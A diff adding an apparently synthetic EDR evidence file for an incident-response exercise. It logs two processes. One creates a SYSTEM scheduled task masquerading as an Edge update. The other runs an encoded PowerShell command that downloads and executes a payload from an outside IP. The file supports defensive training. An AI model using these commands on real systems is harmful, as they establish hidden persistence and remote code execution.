@@ -1,0 +1,12 @@
+{
+  "evidence_id": "E-EDR-008",
+  "type": "edr_process",
+  "source": "SentinelNode EDR",
+  "host": "APP-PRD-01",
+  "synthetic": true,
+  "collection_window_ist": "2026-09-04T11:25:00+05:30/2026-09-04T11:35:00+05:30",
+  "events": [
+    {"time_ist": "2026-09-04T11:30:14+05:30", "pid": 4812, "process": "cmd.exe", "cmdline": "schtasks /create /tn \"MicrosoftEdgeUpdateTaskMachineCore\" /sc minute /mo 30 /ru SYSTEM /tr \"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADcAOgA4ADQANAAzAC8AYgBlAGEAYwBvAG4AJwApAA==\"", "parent": "explorer.exe", "parent_pid": 4568, "user": "VISTARA\\rajesh.kulkarni", "sha256": "SYNTHETIC-fb6d1d7ae52c0a63850d37b094dfc2396dbfb7059a8249116cbf54134d87127a", "synthetic": true},
+    {"time_ist": "2026-09-04T11:32:00+05:30", "pid": 5090, "process": "powershell.exe", "cmdline": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADcAOgA4ADQANAAzAC8AYgBlAGEAYwBvAG4AJwApAA==", "parent": "svchost.exe", "parent_pid": 664, "user": "NT AUTHORITY\\SYSTEM", "sha256": "SYNTHETIC-e630b2fc381d4d437212b8a3acfce8451ce017f9abdafdc41af69e3e063c9374", "synthetic": true}
+  ]
+}
